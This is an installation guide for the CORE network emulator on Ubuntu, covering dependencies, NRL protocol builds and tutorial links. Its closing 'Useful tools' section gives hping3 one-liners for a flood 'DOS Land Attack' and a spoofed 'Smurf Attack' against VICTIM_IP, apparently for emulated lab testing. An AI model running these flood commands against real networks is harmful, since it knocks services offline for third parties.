How to install CORE on Ubuntu (tested on 17.04)

# Install CORE from source
1. Get the source:
    - [https://github.com/coreemu/core]()

2. Install build dependencies:
    ```
    sudo apt-get install build-essential autotools-dev automake wget git gitk
    ```

3. Install network dependencies:
    ```
    sudo apt-get install quagga xorp bird isc-dhcp-server vsftpd apache2 tcpdump radvd at ucarp openvpn ipsec-tools racoon traceroute mgen wireshark tshark docker docker-compose python-docker
    ```

4. Install GUI dependencies:
    ```
    sudo apt-get install ebtables libtcl8.5 libtk-img libtk8.5 tcl8.5 tk8.5
    ```

5. Get and install core specific protocols:
    - EMANE ([https://www.nrl.navy.mil/itd/ncs/products/emane]()):
    ```
    wget https://downloads.pf.itd.nrl.navy.mil/emane/1.0.1-r1/emane-1.0.1-release-1.ubuntu-16_04.amd64.tar.gz
    tar -xvzf emane-1.0.1-release-1.ubuntu-16_04.amd64.tar.gz
    sudo dpkg -i emane-1.0.1-release-1/debs/ubuntu-16_04/amd64/*.deb
    sudo apt-get --fix-broken install
    ```

    - OLSR ([https://www.nrl.navy.mil/itd/ncs/products/olsr]()):
    ```
    wget https://downloads.pf.itd.nrl.navy.mil/olsr/nrlolsrdv7.8.1.tgz
    tar -xvzf nrlolsrdv7.8.1.tgz
    sudo apt-get install libpcap-dev
    cd nrlolsr/unix/ && make -f Makefile.linux
    sudo mv nrlolsrd /usr/bin/
    ```

    - SMF ([https://www.nrl.navy.mil/itd/ncs/products/smf]()):
    ```
    wget https://downloads.pf.itd.nrl.navy.mil/smf/src-nrlsmf-1.1b2a.tgz
    tar -xvzf src-nrlsmf-1.1b2a.tgz
    cd smf-1.1b2/unix/ && make -f Makefile.linux
    _#FIXME_
    ```

    - NHDP([https://www.nrl.navy.mil/itd/ncs/products/nhdp]()):
    ```
    wget https://downloads.pf.itd.nrl.navy.mil/nhdp/nrlnhdp-alpha-0.47.tgz
    (contains SMF and OLSR, nothing more to do here)
    ```

6. Build and install CORE:
```
./bootstrap.sh
./configure
make
sudo make install
```

7. Reload the core-daemon service (and delete old logs):
```
sudo service core-daemon stop && sudo systemctl daemon-reload && sudo rm /var/log/core-daemon.log && sudo service core-daemon start
```

8. Generate CORE documentation
```
sudo apt-get install python-sphinx texlive-latex-base
make html
make latexpdf
```

# Some links
- Official page: [https://www.nrl.navy.mil/itd/ncs/products/core]()
- GitHub: [https://github.com/coreemu/core]()
- Documentation: [https://downloads.pf.itd.nrl.navy.mil/docs/core/core-html/index.html]()

Tutorials:
- Install network services: [http://www.brianlinkletter.com/core-network-emulator-install-network-services/]()
- Customize network services: [http://www.brianlinkletter.com/how-to-customize-core-network-emulator-services/]()
- CORE+docker: [http://www.finmars.co.uk/blog/9-core-and-docker-together-at-last]()

# Useful tools

## hping3
Utility to spam the network ([http://0daysecurity.com/articles/hping3_examples.html]())
### Install

```sudo apt-get install hping3```


### DOS Land Attack 
```hping3 -V -c PKY_CNT -d DATA_SIZE -S -w WIN_SIZE -p DEST_PORT -s SRC_PORT --flood --rand-source VICTIM_IP```
### Smurf Attack
```hping3 -1 --flood -a VICTIM_IP BROADCAST_ADDRESS```